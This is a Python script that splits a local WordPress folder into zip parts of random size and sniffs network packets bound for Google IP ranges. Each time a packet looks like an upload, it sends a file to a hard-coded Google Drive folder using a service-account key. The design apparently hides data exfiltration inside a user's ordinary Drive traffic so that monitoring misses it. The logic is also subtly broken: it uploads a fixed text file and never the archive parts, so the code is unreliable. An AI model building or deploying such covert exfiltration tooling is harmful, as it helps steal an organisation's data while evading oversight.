# Zip files
import os
import zipfile
import shutil
import random
def zip_folder_in_parts(folder_path, zip_file_name):
    # Create a temporary zip file
    temp_zip_file = zip_file_name + '.zip'
    
    # Create a zip file
    with zipfile.ZipFile(temp_zip_file, 'w', zipfile.ZIP_DEFLATED) as zipf:
        # Walk through the folder and add files to the zip
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, folder_path))

    # Split the zip file into parts with random sizes
    part_number = 1
    with open(temp_zip_file, 'rb') as f:
        while True:
            # Generate a random part size between 1MB (1 * 1024 * 1024) and 10MB (10 * 1024 * 1024)
            part_size = random.randint(1 * 1024 * 1024, 10 * 1024 * 1024)
            
            # Create a new part file name
            part_file_name = f"{zip_file_name}.part{part_number:03d}.zip"
            
            with open(part_file_name, 'wb') as part_file:
                part_data = f.read(part_size)
                if not part_data:
                    break
                part_file.write(part_data)
                print(f'Created: {part_file_name} with size {len(part_data)} bytes')
            
            part_number += 1

    # Remove the temporary zip file
    os.remove(temp_zip_file)
    print(f'Removed temporary zip file: {temp_zip_file}')




# Detect upload
import requests
import ipaddress
from scapy.all import sniff, IP, IPv6, UDP
import json

# Correct Google IP Ranges URL
GOOGLE_IP_RANGES_URL = 'https://www.gstatic.com/ipranges/goog.json'
#GOOGLE_IP_RANGES_URL = 'google_ips.json'

# Fetch Google's IP ranges
def get_google_ip_ranges():
    try:
        response = requests.get(GOOGLE_IP_RANGES_URL)
        if response.status_code == 200:
            ip_ranges = response.json()
            
            # Print out the raw JSON structure to understand it (optional)
            # print(json.dumps(ip_ranges, indent=4))  # Pretty print the JSON for inspection

            google_ips = []

            # Extract IPv4 ranges
            if 'prefixes' in ip_ranges:
                for prefix in ip_ranges['prefixes']:
                    # Handle IPv4 Prefix
                    if 'ipv4Prefix' in prefix:
                        google_ips.append(ipaddress.IPv4Network(prefix['ipv4Prefix']))
                    # Handle IPv6 Prefix
                    elif 'ipv6Prefix' in prefix:
                        google_ips.append(ipaddress.IPv6Network(prefix['ipv6Prefix']))
                    else:
                        print("Error: Neither 'ipv4Prefix' nor 'ipv6Prefix' found in response item:", prefix)
                return google_ips
            else:
                print("Error: 'prefixes' key missing in response.")
                return []
        else:
            print("Failed to fetch Google IP ranges.")
            return []
    except Exception as e:
        print(f"Error fetching IP ranges: {e}")
        return []

# Check if the IP address is within Google's IP ranges
def is_google_ip(ip):
    for network in google_ips:
        if isinstance(ip, ipaddress.IPv4Address):
            if ip in network:
                return True
        elif isinstance(ip, ipaddress.IPv6Address):
            if ip in network:
                return True
    return False

# Packet callback function to check for Google Drive traffic
def packet_callback(packet):
    if packet.haslayer(IP):  # IPv4
        ip_dst = packet[IP].dst
        ip_dst = ipaddress.IPv4Address(ip_dst)
    elif packet.haslayer(IPv6):  # IPv6
        ip_dst = packet[IPv6].dst
        ip_dst = ipaddress.IPv6Address(ip_dst)
    else:
        return  # Ignore non-IP packets

    # Check if the destination IP is within Google IP ranges
    if is_google_ip(ip_dst):
        # We're interested in HTTPS traffic, which uses port 443
        if packet.haslayer(UDP) and packet[UDP].dport == 443:
            print(f"Detected traffic to Google IP: {ip_dst} from {packet[IP].src if packet.haslayer(IP) else packet[IPv6].src}")
            print(f"Packet length: {len(packet)} bytes")
            if len(packet) > 200:
                # You could further analyze packet size, duration, or patterns here
                print("upload detected")
                upload_file("file_upload.txt")

# Function to start sniffing network traffic
def start_sniffing():
    print("Starting network traffic capture for Google Drive uploads...")
    #sniff(prn=packet_callback, store=0)
    sniff(iface="wlo1", prn=packet_callback, store=0)  # Replace "wlan0" with your network interface



# Upload file(s)
from googleapiclient.discovery import build
from google.oauth2 import service_account

SCOPES = ['https://www.googleapis.com/auth/drive']
SERVICE_ACCOUNT_FILE = 'service_account.json'
PARENT_FOLDER_ID = "1v1Pse9xihZVzLclq0EYIj5K8csW0jJrB"

def authenticate():
    creds = service_account.Credentials.from_service_account_file(SERVICE_ACCOUNT_FILE, scopes=SCOPES)
    return creds

def upload_file(file_path):
    creds = authenticate()
    service = build('drive', 'v3', credentials=creds)

    file_metadata = {
	    'name' : file_path,
        'parents' : [PARENT_FOLDER_ID]
    }

    file = service.files().create(
        body=file_metadata,
        media_body=file_path
    ).execute()

if __name__ == "__main__":
    # Zip files
    folder_to_zip = '/home/dev06/Downloads/wordpress'
    output_zip_file = 'output_zip'
    zip_folder_in_parts(folder_to_zip, output_zip_file)

    # Wait for upload
    google_ips = get_google_ip_ranges()

    if google_ips:
        start_sniffing()
    else:
        print("Google IP ranges could not be fetched. Exiting.")